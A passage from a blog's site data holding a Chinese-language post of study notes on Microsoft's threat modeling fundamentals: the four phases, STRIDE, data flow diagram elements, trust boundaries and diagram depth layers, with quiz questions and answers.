https://blog.csdn.net/weixin_43578492/article/details/112128767","categories":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/categories/ctf/"},{"name":"ctfshow","slug":"ctf/ctfshow","permalink":"https://tari.moe/categories/ctf/ctfshow/"},{"name":"ctf练习","slug":"ctf/ctfshow/ctf练习","permalink":"https://tari.moe/categories/ctf/ctfshow/ctf%E7%BB%83%E4%B9%A0/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/tags/ctf/"},{"name":"ctfshow","slug":"ctfshow","permalink":"https://tari.moe/tags/ctfshow/"},{"name":"ctf练习","slug":"ctf练习","permalink":"https://tari.moe/tags/ctf%E7%BB%83%E4%B9%A0/"}]},{"title":"威胁建模安全基础知识","slug":"2021/thread-modeling","date":"2021-04-04T04:54:33.000Z","updated":"2022-02-01T04:24:06.068Z","comments":true,"path":"/p/2021/thread-modeling/","link":"","permalink":"https://tari.moe/p/2021/thread-modeling/","excerpt":"","text":"实习过程中零零碎碎学了一些，但还没系统学过，发现微软有个挺全面的，打算系统学习一波~ https://docs.microsoft.com/zh-cn/learn/paths/tm-threat-modeling-fundamentals/ 感觉讲的特别好…所以就直接索性一边看一边补充的 copy 下来了 威胁建模简介威胁建模是一种有助于保护系统、应用程序、网络和服务的有效技术。它可帮助你在开发生命周期的早期确定潜在的威胁和降低风险策略。 威胁建模使用以图形形式演示系统工作方式的数据流关系图。之后，它应用一个框架来帮助你发现和修复安全问题。 如果未首先建立威胁模型而发布系统，该系统将使你的客户和组织面临风险。 简单起见，此学习路径将系统、应用程序和服务统称为系统。 何时使用威胁建模在设计新系统或更新现有系统时，可使用威胁建模。 示例包括： 创建新的 Azure 微服务，用于报告组织的云资源使用情况以便进行预算 设计公共 API 以向客户提供对数据的访问权限 向现有应用程序添加新功能 谁可以进行威胁建模只要了解系统如何工作，并且对安全性有基本的理解，任何人都可以进行威胁建模。 此技术可应用于任何： 软件交付方式（ 如 敏捷型 或 瀑布型 ，好多瀑布型介绍很繁琐，直接找了个对比的） 部署节奏（每小时、每月或每年） 学习目标在本模块，你将了解威胁建模的四个概括性步骤，并能够学得以下内容： 了解明确要求和假设以帮助创建数据流关系图的重要性 了解可帮助你查找系统中安全问题的框架 了解有助于减轻或消除潜在威胁的安全控制类别 重点介绍在部署之前验证假设、要求和修复的重要性 无必备知识即可学习 （ 模块1 | 威胁建模阶段只要了解系统工作原理，并具有信息安全知识，任何人都可以使用威胁建模技术。 此方法分为四个不同的阶段，每个阶段都包含重要步骤，可帮助你创建数据流关系图并对其进行分析，以发现潜在的威胁。 阶段 标题 说明 1 设计 明确系统的所有要求，并创建数据流关系图 2 中断 将威胁建模框架应用到数据流关系图 3 修复 确定如何正确组合安全控制来解决每个问题 4 验证 验证是否满足了要求 本模块(1) 中的单元将较为概括地介绍重要的威胁建模概念，本文 模块2 开始将详细讨论这些概念。 步骤1 - 设计设计阶段是进行威胁建模活动的基础。 你需要尽可能多地收集关于你所构建的内容及所用资源的数据。 目标 清楚地了解系统的工作原理 列出系统使用的每个服务 枚举有关环境和默认安全配置的所有假设 使用正确的上下文深度级别创建数据流关系图 如果不完成此阶段，你可能会忽略系统的重要安全设计注意事项，这可能会使你的客户面临风险。 提出有关系统的问题尽可能多地提出有关系统的问题。 可以考虑以下问题： 区域 问题 系统说明 系统的功能是什么？ 服务处理的业务流程是什么？ 是否明确定义了这些流程？ 系统环境 系统是在云中还是在本地构建的？ 它将在哪个 OS 上构建？ 是否将使用容器？ 系统是应用程序、服务还是其他完全不同的东西？ 方案 用户将如何使用系统？ 如何不使用系统？ 权限 系统是否有脚本执行、数据或硬件访问要求？ 如果有，是哪些要求？ 云提供商 系统将使用哪个云提供商？ 它提供哪些默认安全配置选项？ 这些选项如何影响系统安全要求？ 操作系统 系统将使用哪种操作系统？ 它提供哪些默认安全配置选项？ 这些选项如何影响系统安全要求？ 第一方和第三方 系统将使用哪些第一方和第三方服务？ 它们提供哪些默认安全配置选项？ 这些选项如何影响系统安全要求？ 帐户 系统中将使用哪些帐户类型，例如用户和管理员？ 这些帐户是本地帐户还是云帐户？ 它们需要哪些访问权限？为什么？ 标识和访问控制 系统将如何帮助保护这些帐户？ 它会依赖 Azure Active Directory (Azure AD) 吗？ 它会使用访问控制列表 (ACL)、多重身份验证 (MFA) 和会话控制等功能吗？ 令牌和会话 系统会处理 SOAP API 或 REST API 之类的请求吗？ 它将如何处理不同的会话？ 旁路 系统是否使用或需要后门？ 如果需要，它将如何工作？ 记录、监视和备份 系统使用什么机制来记录安全事件、监视异常和备份系统数据？ 它会捕获哪些事件类型？ 网络 将使用哪些入侵检测和保护系统？ 如何对通信进行加密？ 数据 系统将创建或处理哪种类型的数据？ 数据分类类型是什么？ 系统如何信任数据源？ 它将如何分析数据？ 预期的输入和输出行为是什么？ 如何处理验证？ 如何在所有状态下对数据进行加密？ 机密管理 系统如何处理密钥、证书和凭据？ 上面列出的内容很广泛，但并不详尽。 与你的同事和安全团队联系，以明确系统的所有相关上下文。 如果你有专门的安全团队，请与他们安排白板会议以进行初始设计。 它将节省相当长的时间。 创建数据流关系图使用答案创建数据流关系图。 它显示了数据生命周期中每个阶段的数据，包括信任区中的更改。 示例包括： 用户登录到 Azure 中托管的 Web 应用程序以访问数据 管理员更改 Web 应用程序使用的弹性资源的默认安全配置 自动化的每日脚本，用于监视 Web 应用程序的活动日志并通知管理员任何异常情况 Microsoft 工程团队需要提交数据流关系图，这是其安全合规性要求。 这些关系图有助于进行与安全性相关的探讨。 图解工具Microsoft 工程师建议使用现在提供的两种工具之一： Threat Modeling Tool 在线安装版，https://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling 离线安装版，https://www.microsoft.com/en-us/download/details.aspx?id=49168 （2016） 想装其他离线版本的，Guguru 一下 microsoft threat modeling tool offline installer 就好了 Visio，（要钱的 打扰了 关系图元素数据流关系图显示了给定系统中的数据流。 它通常以用户或数据存储的请求开始，以数据存储或 Analytics Services 结束。 数据流关系图使用不同的形状来指示它们所表示的元素。 元素 形状 定义 过程 接收、修改输入或将输入重定向到输出的任务，如 Web 服务。 数据存储 永久和临时数据存储，如 Web 缓存和 Azure 托管数据库。 外部实体 直接控制之外的任务、实体或数据存储，如用户和第三方 API。 数据流 进程、数据存储和外部实体之间的数据移动，如连接字符串和有效负载。 信任边界 信任区域在数据流经系统时更改，如用户使用 Internet 访问受保护的公司网络时。 数据流关系图元素还需要上下文，以帮助人们了解如何在系统中的使用和保护它们。 数据流图标中应包含的信息量数据流关系图中包含的信息量取决于几个关键因素： 因素 说明 正在构建的系统类型 如果系统不处理敏感数据或仅在内部使用，则它可能比面向外部的系统需要更少的上下文 安全团队所需的上下文 安全团队在威胁模型中的目标非常精确。 与安全团队交流，确认所需的层次 如果未能包含正确的上下文，将导致安全检查不完整、系统存在潜在的风险。 关系图层次为了帮助你了解要包含的信息量，请在以下四个上下文层次之间进行选择： 层次 标题 说明 0 系统 任何系统的基础。 数据流关系图包含系统的主要部分，并提供足够的上下文，可帮助你了解其工作原理及彼此交互方式。 1 流程 使用额外的数据流关系图，关注系统每个部分的数据流关系图。 用于每个系统，尤其是处理敏感数据的系统。 此层的上下文应有助于确定威胁以及更有效地降低或消除风险的方法。 2 子过程 关注系统中某一部分的每个次级部分的数据流关系图。 用于关键的系统。 示例包括适用于安全环境的系统、处理高度敏感数据的系统或包含高风险评级的系统。 3 更详细 关注高度关键的内核级系统。 数据流关系图详细描述每个子过程。 大多数数据流关系图应同时包含第 0 层和第 1 层。 与安全团队交流，确认所需的层次深度。 工具 Threat Modeling Tool 在线安装版，https://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling 离线安装版，https://www.microsoft.com/en-us/download/details.aspx?id=49168 （2016） 想装其他离线版本的，Guguru 一下 microsoft threat modeling tool offline installer 就好了 Visio，（要钱的 打扰了 知识检查 设计阶段要进行哪些工作？ A. 你知道系统的工作方式。 还可以确定从云提供商和集成服务继承的安全要求、保证或差距 B. 此时不必研究所有安全保证、假设和差距，唯一的任务就是创建数据流关系图 C. 在创建数据流关系图之前，确定并解决与系统相关的所有安全问题 参考答案：== A == 解释：A. 在创建数据流关系图之前，请尽可能收集有关系统的上下文。B. 在设计阶段较早收集尽可能多的上下文，你就可以做出明智的决策以更好地保护系统。C. 在设计阶段之后的中断和修复阶段执行创建关系图的任务。 步骤2 - 中断在中断阶段，需使用数据流关系图查找针对系统的潜在威胁。 此过程使用威胁建模框架，以帮助你查找最常见的威胁和防范威胁的方法。 目标 选择以 “保护系统” 或 “了解攻击者” 为核心的方法 （可参考模块4了解这两种方法） 使用 STRIDE 框架识别常见威胁（STRIDE威胁模型几乎可以涵盖目前绝大部分安全问题），即 欺骗（Spoofing） 篡改（Tampering） 否认（Repudiation） 资讯泄露（Information disclosure），可能是隐私泄露或是资料外泄 阻断服务攻击（Denial of service） 特权提升（Elevation of privilege 如果不完成此阶段，就不会发现系统中的潜在威胁，这可能会导致未来出现违规现象。 确定方法侧重点首先，选择是要找到保护系统的方法，还是想要尽可能地了解攻击者及其动机。 示例包括： 侧重点 可以查找的内容示例 系统 发现用户与系统之间的未加密连接存在问题。 攻击者 进一步了解方法、动机和强化系统入口点的方法。 资产 基于分类数据处理等功能确定关键资产，主要专注于保护这些资产。 Microsoft 产品工程师主要致力于保护系统。 渗透测试团队两者兼顾。 选择威胁框架接下来，选择一个框架，帮助生成系统中的潜在威胁。 Microsoft 通常使用 STRIDE（六个主要威胁类别的首字母缩写）提供广泛但不完整的威胁列表。 此框架可帮助你提出有关系统的几个重要问题： 威胁 定义 问题 威胁示例 欺骗 攻击者冒充某人或某物 通信的双方是否都通过了身份验证？ 通过看似合法的帐户向用户发送一封带有恶意链接和附件的电子邮件，以捕获用户的凭据、数据和设备访问权限。 篡改 攻击者在未经授权的情况下更改数据 如何得知某人无法更改传输中的数据、正在使用的数据或静态数据？ 通过弱 API 调用处理修改内存，导致崩溃和泄漏敏感错误消息。 否认性 攻击者声称尚未执行任何操作 每个操作是否可以绑定到标识？ 声称没有删除数据库记录。 信息泄露 攻击者看到了不应看到的数据 如何得知某人无法看到传输中的数据、正在使用的数据或静态数据？ 访问安全控制较弱的未授权文档和文件夹。 拒绝服务 攻击者使你的系统崩溃 系统中是否存在资源受限的区域？ 向网络发送大量请求。 权限提升 攻击者未经授权而可访问数据 如何得知某人可以执行此操作？ 利用输入处理逻辑或内存中的弱点来提取数据。 知识检查 中断阶段要进行哪些工作？ A. 通过相关框架选择重点领域，以系统地识别系统中的潜在威胁。 B. 通过相关框架选择重点领域，以系统地识别可以应用到系统的解决方案。 C. 安全团队开会讨论，选择重点领域和相关框架，以系统地识别系统中的潜在威胁。 参考答案：== A == 解释：A. 在使用 STRIDE 查找潜在威胁时，请关注系统或攻击者。B. 此任务属于阶段 3 - 修复阶段。C. 在大多数情况下，可以选择与安全团队开会讨论，但不强制要求这么做（除非组织有相关要求）。 步骤3 - 修复在修复阶段，需要决定如何处理所有威胁。 每个 STRIDE 威胁都对应到一项或多项安全控制，这些控制措施提供不同的功能和类型供你选择。 目标 根据优先级框架或安全 bug 栏衡量每个威胁的优先级 在 bug 管理服务中将每个威胁作为任务或工作项进行跟踪 生成对应于 STRIDE 威胁的安全控制建议 选择一项或多项安全控制类型和功能来应对每个威胁 解决任务 如果不完成此阶段，就找不到安全控制来帮助降低风险或正确跟踪每个威胁。 设置威胁跟增工作流确定威胁的优先级首先，根据优先级框架或安全 bug 栏来衡量每个威胁。 此过程可帮助你计划资源来解决对组织而言更重要的问题。 此过程使用三个关键变量： 变量 说明 影响 使用 STRIDE 类别分配影响。 严重性 使用内部 bug 栏或优先级框架来分配最坏情况下的严重性。 风险 对安全控制有效性和实现成本进行计算。 Microsoft 工程师使用内部安全 bug 栏，为威胁分配“严重”、“重要”、“中等”、“低”或“信息”严重性等级。 请咨询安全团队，确认如何确定问题的优先级。 创建任务接下来，在 Azure DevOps Services 等 bug 管理解决方案中添加每个威胁。 部分优点包括： 进一步确定问题责任人 有效跟踪历史记录 让你能够使用标准化模板来进行优先级和解决方案演练 评估威胁有效性和成本查看对应于 STRIDE 威胁的每项安全控制建议。 记下最有效和成本最低的建议。 以下是一些示例： 威胁 安全控制 安全控制示例 欺骗 身份验证 发送和接收使用数字签名进行签名的消息，以验证来源并确保消息完整性。 篡改 完整性 验证输入以防止处理恶意有效负载和错误处理意外行为。 否认性 不可否认性 创建和保护包含用户操作和时间戳的安全日志。 信息泄露 保密性 应用访问控制列表，以确保合适的用户可以访问适当的数据。 拒绝服务 可用性 使用弹性资源管理不断增加或减少的使用量。 权限提升 授权 使用最少的访问量运行服务。 可能有这样的安全控制，可以同时减轻或完全消除多个威胁。 例如，使用 SSL/TLS 创建安全传输通道，以帮助防止恶意数据修改或泄露。 安全控制措施类型和功能安全控制具有不同的类型和功能。 结合使用时，它们有助于保护系统的安全，并创建多个安全保护层，也称为深层防御。 你可以选择一种或多种安全控制类型： 物理类型，如摄像头 技术类型，如加密 管理类型，如策略 它们可能有一项或多项安全控制功能： 函数 描述 预防 降低威胁的概率或影响，如防火墙。 检测 识别发生的攻击，如监视。 纠正 控制系统如何响应其受到的攻击，如系统修补程序。 恢复 从攻击中恢复系统，如备份。 阻碍 阻止攻击者访问系统，如最低权限。 为每个问题添加安全控制详细信息在 bug 管理解决方案中为每个问题添加详细信息，然后使用以下其中一个解决方案解决各个问题。 这在不同组织之间存在略微差异： 解决方案 描述 减轻 将通过 Bug 修复或重新设计来解决问题，以减轻或消除威胁影响和严重性。 转移 由其他系统或团队处理问题。 避免 去除系统中包含问题的部分。 接受 没有解决方案，将接受风险。 需要经授权的风险决策者的批准，其中决策者可能取决于威胁的严重性。 严重威胁可能需要高级领导的批准，而深层防御风险可能需要高级工程师批准。 与你的团队交流以获得战略指导。 知识检查 修复阶段要进行哪些工作？ A. 在部署系统之前验证所有修补程序。 B. 在这一阶段，你将生成并验证一系列安全控制，并设置其优先级，以减轻或消除风险。 C. 此时，选择框架以帮助生成潜在的威胁。 参考答案：== B == 解释：A. 属于步骤 4 - 验证阶段。B. psw 每个威胁都对应到一个可降低或消除风险的安全控制。 根据组织的安全风险惯例，确定这些威胁的优先级并进行跟踪。C. 此任务属于步骤 2 - 中断阶段。 步骤4 - 验证验证阶段是威胁建模过程的最后一步，通常发生在部署系统之前。 它涉及到确保满足要求、验证假设以及准备好安全控制。 目标 确认系统满足所有新旧安全要求 配置云提供商、操作系统和组件以满足安全要求 确保使用正确的安全控制解决所有问题 在部署前对系统进行手动和自动验证 如果不完成此阶段，就无法验证是否已成功完成安全工作。 验证要求和设置默认值首先，验证是否满足第一阶段创建的所有要求。 示例： 网络安全计划 机密管理解决方案实施 日志记录和监视系统 标识和访问控制 然后，确保云提供商、操作系统和组件的默认配置设置已更改，可满足所有安全要求。 示例： 启用 Azure SQL 数据库透明数据加密以保护磁盘上的数据 使用基于角色的访问控制 (RBAC) 向用户、组和应用程序分配权限 跨所有配置文件启用 Windows 防火墙 应解决 bug 管理解决方案中记录的所有问题并验证所有修补程序。 执行验证最后一部分涉及运行手动和自动验证。 在 Microsoft，部署系统之前必须对其进行验证，验证过程可能包含自动扫描程序、代码评审和渗透测试。 可以在每次部署之前或隔一定的时间（如每 6 - 12 个月）强制执行该过程。 如果以下任一问题的答案为“是”，最好设置较短的验证周期： 我的系统会在部使用吗？ 它可以处理机密数据吗？ 我必须遵守某些规定吗？ 我的组织是否要求实施其他安全保护过程，以应对隐私影响、运营风险或开发要求？ 知识检查 验证阶段要进行哪些工作？ A. 实施一系列适用的安全控制，以减轻或消除风险。 B. 在将代码推送到暂存分支进行部署之前，需要对其进行手动检查。 C. 针对先前产生的威胁手动或自动验证系统，以验证安全控制是否降低或消除了风险。 参考答案：== C == 解释：A. 此任务属于步骤 3 - 修复阶段。B. 此答案更适用于操作方面，而不是威胁建模过程。C. 此阶段的主要工作是验证修复、假设和满足要求。 小结摘要威胁建模是帮助保护系统、应用程序、网络和服务的有效方法。 它可以识别潜在的威胁并推荐风险降低策略，以帮助你在开发生命周期的早期实现安全目标。 本模块涵盖了以下内容： 了解明确要求和假设以帮助创建数据流关系图的重要性 了解可帮助你查找系统中安全问题的框架 了解有助于减轻或消除潜在威胁的安全控制类别 重点介绍在部署之前验证假设、要求和修复的重要性 后续步骤在此学习路径的后续几个模块中，我们将了解在四个阶段引入的每个概念，并进行详细讨论： 模块 标题 说明 2 使用数据流关系图元素创建威胁模型 了解数据流关系图中的每个元素，包括何时使用它们以及要包含的上下文。 3 提供具有适当深度层的上下文 在创建数据流关系图之前，了解每个上下文层次的差异和适用情形。 4 处理数据流关系图时关注适当的威胁模型 了解关注威胁建模活动的不同方法。 5 使用框架识别威胁并找到减少或消除风险的方法 深入研究 STRIDE，并进一步了解存在的风险以及如何针对这些风险保护系统。 6 设置问题的优先级并应用安全控制措施 了解如何设置威胁优先级，并了解系统安全控制的不同类型和功能。 7 使用推荐工具创建数据流图 了解可用于威胁建模的工具。 了解详细信息安全开发生命周期https://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling 模块2 | 使用数据流关系图元素创建威胁模型简介数据流关系图由呈现为形状和线条的元素构成。 数据流关系图以图形方式表示系统的各个主要部分。 示例包括： 用于存储客户数据的 Azure DB 处理用户请求的 Web 服务 与系统交互的用户 跨信任区域级别更改的数据流 在威胁建模中使用元素及其交互，以帮助确定威胁并降低系统风险。 此过程可帮助工程师更有效地进行协作，同时保护其系统免受最常见的威胁攻击。 本模块将介绍数据流关系图的每个元素。 这些元素具有不同的形状和功能，并且需要特定的上下文。 在整个学习路径中，元素也可以称为“模具”。 何时使用元素在创建数据流关系图时使用这些元素。 关系图可显示系统创建、操纵、存储以及删除数据的方式。 我们以第一个模块中的示例为基础进行构建： Azure 微服务 - 添加元素以指定用户、身份验证过程、数据存储、数据请求和响应处理过程。 别忘了指定信任区域级别更改。 公共 API - 添加元素以指定用户、数据存储、日志记录和监视流程以及系统的其他部分。 现有应用程序上的新功能 - 添加元素以表示系统的现有部分和新的部分。 学习目标在本模块中，你将能够： 区分每个元素的形状和功能 在创建数据流关系图时，包含元素的正确上下文 无必备知识即可学习 （ 数据流关系图元素数据流关系图由各种形状组成，这些形状用于创建系统的图形表示形式。 每个形状都表示一个独特的功能。 系统将分析每个交互以帮助识别潜在的威胁和找到降低风险的方法。 通过正确使用形状，你能更好地明白同事和安全团队提供的信息。 每个人都能了解该系统的工作方式。 这还可以使他们无需查阅无数的设计文档和开发计划即可启动系统并使其正常运行。 如果无法在数据流关系图中正确地体现系统的所有部分，则有可能部署具有潜在漏洞的系统。 元素 形状 定义 示例 过程 接收、修改输入或将输入重定向到输出的任务，如 Web 服务。 Web 服务 数据存储 永久和临时数据存储，如 Web 缓存和 Azure 托管数据库。 Web 缓存和 Azure DB 外部实体 直接控制之外的任务、实体或数据存储，如用户和第三方 API。 用户和第三方 API 数据流 进程、数据存储和外部实体之间的数据移动，如连接字符串和有效负载。 连接字符串和有效负载 信任边界 信任区域在数据流经系统时更改，如用户使用 Internet 访问受保护的公司网络时。 用户通过 Internet 连接到安全的公司网络 我们将在接下来的几个单元中讨论每个元素。 过程 - 任务元素 此元素用一个圆圈表示，表示可以修改接收的输入或将接收的输入重定向到其相应输出的活动。 示例包括： 接收 API 调用请求并将其转发到 API 处理服务的微服务 在数据写入数据存储之前验证数据输入的代码 何时使用过程元素在以下项之间添加过程元素： 数据存储 - 处理数据存储之间的所有通信的过程 具有其他元素的外部实体 - 处理所有任务和通信的过程 过程 - 处理所有任务的过程 根据数据流关系图所需的信息深度级别，可以使用过程元素来表示几个不同的用例： 用例 描述 存根 在较高级别的数据流关系图中将过程元素用作“存根”，这是一种有助于保持整洁的好方法。 它涉及为特定过程创建一个单独的数据流关系图，并将其映射回更高级别的关系图。 它的工作方式类似于“放大”功能，在“放大”过程时，可以使用深层数据流关系图。 多个任务 当过程处理多个任务时，此用例适用。 此上下文非常重要，因为它允许查看数据流程图的任何人为每个任务应用适当的安全控制。 包括上下文在每个过程元素中包含以下上下文： 上下文 问题 代码 此过程是否以 C#、C++、Objective C、Java 或脚本语言运行？ 权限级别 此过程是否需要内核、本地或管理级别权限才能运行？ 服务隔离 该过程是否在沙盒中运行？ 输入 此过程可以接受所有人、本地帐户还是仅限管理员的输入？ 验证 此过程如何分析、处理和接受输入？ 身份验证 此过程是否依赖于 Azure Active Directory 进行身份验证？ 如果不是，此过程依赖于什么进行身份验证？ 授权 它是否依赖于访问控制列表 (ACL) 进行授权？ 如果不是，此过程依赖于什么进行授权？ 知识检查 以下哪一项操作最能描述过程？ A. Web 门户要求用户提供其凭据。 B. 缓存为用户存储与服务相关的 Cookie。 C. 第三方 API 向其请求者发送请求的数据。 参考答案：== A == 解释：A. 门户将处理用户输入，并将其发送到过程的下一部分。B. 存储数据的行为是与数据存储相关的事件。C. 传输数据的行为是与数据流相关的事件。 数据存储 - 存储元素 此元素用平行线表示，表示临时或永久存储的数据。 示例包括： 使用浏览器缓存来存储与用户会话相关的数据 向数据库添加安全日志事件 何时使用数据存储元素 在每次将数据存储在 Azure DB 或本地缓存等位置时 如果要在两个数据存储之间建立通信，请不要忘记在它们之间添加进程 数据存储和外部实体都可启动数据流，因此请验证这两者中的任意一个是否已就绪 确保将数据后期处理包含在内，例如 Azure Analytics 等分析服务。 此过程经常被忽略。 包含上下文在每个数据存储元素中包含以下上下文： 上下文 问题 类型 系统是否使用 Azure SQL、Cookie、本地或其他某种类型的存储？ 如果是，系统使用的是哪种存储？ 功能 如何使用存储？ 它是否用于共享数据、存储备份、安全日志、凭据和机密？ 权限级别 如何实现访问控制？ 拥有读写权限的人员有哪些？ 其他控制 数据是否加密？ 磁盘是否加密？ 是否使用数字签名？ 知识检查 以下哪一项操作最能描述数据存储？ A. Web 门户要求用户提供其凭据。 B. 缓存为用户存储与服务相关的 Cookie。 C. 第三方 API 向其请求者发送请求的数据。 参考答案：== B == 解释：A. 处理输入和输出的行为是与过程相关的事件。B. 存储数据的行为是与数据存储相关的事件。C. 传输数据的行为是与数据流相关的事件。 外部实体 - 无控制元素 外部实体元素由正方形表示，外部实体可以是过程、数据存储，甚至是直接控制之外的完整系统。 示例包括： 与服务交互的用户 与第三方身份验证服务紧密集成 组织内由其他团队创建的服务 何时使用外部实体元素 在要表示不能直接修改的内容时 数据存储和外部实体都可启动数据流，因此请验证这两者中的任意一个是否已就绪 包含上下文在每个外部实体元素中包含以下上下文： 上下文 问题 源 实体是内部实体还是外部实体？ 类型 实体是用户、服务提供商还是 Web 服务？ 身份验证 此过程是否依赖于 Azure Active Directory 进行身份验证？ 如果不是，此过程依赖于什么进行身份验证？ 授权 它是否依赖于访问控制列表 (ACL) 进行授权？ 如果不是，此过程依赖于什么进行授权？ 知识检查 以下哪一项操作最准确地描述了外部实体？ A. Web 门户要求用户提供其凭据。 B. 缓存为用户存储与服务相关的 Cookie。 C. 第三方 API 向其请求者发送请求的数据。 参考答案：== C == 解释：A. 处理输入和输出的行为是与过程相关的事件。B. 存储数据的行为是与数据存储相关的事件。C. 传输数据的行为是与数据流相关的事件。 这 C 答案的解释好像有点问题？应该解释为 第三方 API 向请求者启动了数据流？ 数据流 - 传输元素中的数据 元素之间的数据移动用方向箭头表示，**用于指示数据源和目标之间的通信**。 示例包括： 用户提交的用于访问服务的凭据 过程发出的向数据存储添加项的请求 何时使用数据流元素 在每个元素交互之间 调出正在传输的数据类型，并包括其传输方式 在大多数情况下，包括对每个请求的响应 包含上下文包含每个数据流元素的以下上下文： 上下文 问题 描述 数据流是否传递会话令牌、SQL 字符串或用户凭据？ 如果不是，那么数据流传递哪些内容？ 协议 流使用 HTTPS 还是 SOAP？ 如果都不是，那么流使用的是什么协议？ 流序列 系统是否枚举数据流以便更容易遵循流序列？ 类型 数据流中包含哪些类型的数据？ Cookie？ XML？ SOAP 有效负载？ REST 有效负载？ JSON 有效负载？ 其他控制 数据流是否启用了伪造保护？ 是否启用了其他安全标志？ 身份验证 此过程是否依赖于 Azure Active Directory 进行身份验证？ 如果不是，此过程依赖于什么进行身份验证？ 授权 它是否依赖于访问控制列表 (ACL) 进行授权？ 如果不是，此过程依赖于什么进行授权？ 知识检查 以下哪一项操作最能描述数据流？ A. 用户凭据从过程传输到身份验证服务提供商。 B. 存储会话令牌以供以后使用。 C. 第三方 API 处理服务分析请求。 参考答案：== A == 解释：A. 传输数据的行为是与数据流相关的事件。B. 存储数据的行为是与数据存储相关的事件。C. 处理数据的行为是与过程相关的事件。 信任边界 - 信任区域更改元素信任边界框 信任边界线 信任边界用虚线或方框表示，用于描述跨不同信任区域级别的数据流。 示例包括： 防火墙 与第三方服务的连接 系统的某些部分仅对管理员可用 信任区域不断变化的区域最易受到攻击者的攻击，应谨慎设计此类区域。 Microsoft 已预定义了一些供工程师内部使用的信任区域要求。你能清楚地确定要应用哪些边界。对于 Microsoft 的员工，请与安全团队联系以了解详细信息。 何时使用信任边界元素关于信任边界，需要记住以下几个要点： 包含信任边界以处理跨不同信任区域的数据流 信任边界线用于表示跨大型环境（例如 Internet）的数据流 信任边界框表示小型环境，例如沙盒环境和企业网络 包含上下文在每个信任边界元素中包含以下上下文： 上下文 问题 描述 公司网络边界？Internet？ Azure 订阅？ 知识检查 以下哪一项操作最能描述跨信任边界的数据？ A. 用户发送到托管在 Azure 上的 Web 服务的数据。 B. 在同一 Azure 订阅下，从 Web 服务发送到 Azure 上的数据存储的数据。 C. 从数据存储发送到 Azure 上同一租户下的进程的数据。 参考答案：== A == 解释：A. 将数据从不受信任的区域传输到受信任区域的行为跨越了信任边界。B. 从同一受信任区域内的资源传输数据的行为不会跨越信任边界。C. 从同一受信任区域内的资源传输数据的行为不会跨越信任边界。 小结数据流关系图是系统的图形表示形式，它应包含每个适用的过程、数据存储、外部实体、数据流和信任边界。 本模块涵盖了以下内容： 区分了每个元素的形状和功能 了解了在创建数据流关系图时元素的正确上下文 模块3 | 提供具有适当深度层的上下文介绍工程师利用威胁建模能够以图形方式向他人描述系统。 它创建了一个共同的基础，并实现了更加集中的安全对话。 深度层的重要性根据要构建的系统和所需的上下文，威胁模型可能变得太复杂或级别太高。 数据流关系图深度层可帮助你了解要包含多少上下文以及何时使用它们。 请与同事和安全团队联系，选择适当的深度层。 也可以将此模块用作参考。 学习目标在本模块中，你将能够： 了解数据流关系图深度层之间的差异 了解何时使用每个层 无必备知识即可学习 （ 数据流关系图深度层数据流关系图深度层可帮助你确定要成功进行威胁建模练习应包括多少上下文。 有多个因素可帮助确定要了解的深度。 每个系统都应该大致了解它们的工作方式。 大多数系统应该具有附加的数据流关系图，这些关系图侧重于需要仔细研究的系统部分。 示例包括： 分析高度敏感数据的过程 第三方身份验证系统 威胁建模中大致使用了四个深度层： 层 描述 0 对于所有系统都是必需的，并且包含主要系统部分。 1 对于大多数系统是必需的，并且包含每个系统部分的其他关系图。 2 对于高度敏感的系统是必需的，并且包含系统子部分的其他关系图。 3 对于关键级别系统或内核级别系统是必需的，并且包含每个过程的其他关系图。 我们将在接下来的几个单元中介绍各个深度层。 第 0 层 - 系统层数据流关系图的系统层是任何系统的起点，因此必须为所有系统创建系统层。 目标：表示主要的系统部分（具有足够的上下文），可帮助你了解其工作原理及彼此交互方式。 系统层关系图应容纳在一个页面中。 它还应只包含系统处理的主要过程。 提供尽可能多的上下文，并清楚标记每个元素，以便任何人都能理解它的工作方式。 系统层也称为上下文层。 何时使用系统层你创建的每个系统都需要系统层。 高级别的上下文可以帮助任何人深入了解系统，从而参与更有意义的讨论。 深入了解系统部分在大多数情况下，系统部分需要进行更深入的研究，因为它们会带来风险。 示例包括： 任何新系统都会给环境带来未知风险 新的分析程序、协议和文件格式 新的身份验证和授权机制 新的机密存储或加密算法 与第三方身份验证系统（例如 Facebook）集成 主要功能所需的提升权限 所需的未加密信道 如果是这种情况，请为每个系统部分创建其他数据流关系图。 执行以下步骤： 步骤 指南 1 使用清晰的描述标签创建一个过程元素，例如“Web 服务名称”。 2 创建一个新文件，并完全按照描述标签为其命名。 3 仅将数据流关系图侧重于要“放大”的系统部分。 结果将获得过程层（称为第 1 层）中的一系列数据流关系图。 知识检查 第 0 层通常被称为什么？ A. 上下文层。 B. 过程层。 C. 子过程层。 参考答案：== A == 解释：A. 此层是任何系统的起点。 也称为系统层。B. 此层侧重于每个系统部分。C. 此层侧重于特定系统部分的系统子部分。 第 1 层 - 过程层数据流关系图的过程层是第二层且应该用于大多数系统。 此层的数据流关系图包含单独的数据流关系图，这些关系图详细介绍每个系统部分。 目标：表示次要的系统部分（具有足够的上下文），可帮助你了解其工作原理及彼此交互方式。 与系统层相似，过程层中的数据流关系图应容纳在一个页面中，并包含其各自系统部分的所有过程。 大多数数据流关系图都需要过程级别深度层才能进行正确评估。 何时使用过程层对每个系统都使用过程层，尤其是在处理敏感数据时。 具有敏感数据的系统遭受攻击的风险更高。 此级别的上下文可帮助你找出威胁以及更有效地降低或消除风险的方法。 深入了解系统部分在某些情况下，由于系统部分的敏感性和风险增加，可能需要更精细的上下文。 通过转到此层，可以更好地评估威胁和风险降低策略。 遵循系统层中的相同规则。 步骤 指南 1 使用清晰的描述标签创建一个过程元素，例如“Web 服务工作进程名称”。 2 创建一个新文件，并完全按照描述标签为其命名，命名采用类似路径的结构，例如“Web 服务名称 - Web 服务工作进程名称”。 3 仅将数据流关系图侧重于要“放大”的系统子部分。 结果将获得子过程层（称为第 2 层）中的一系列数据流关系图。 类似路径的文件命名结构有助于区分不同的级别 知识检查 大多数应用程序属于哪一层？ A. 上下文层。 B. 过程层。 C. 子过程层。 参考答案：== B == 解释：A. 此层是任何系统的起点。 也称为系统层。B. 此层侧重于每个系统部分。C. 此层侧重于特定系统部分的系统子部分。 第 2 层 - 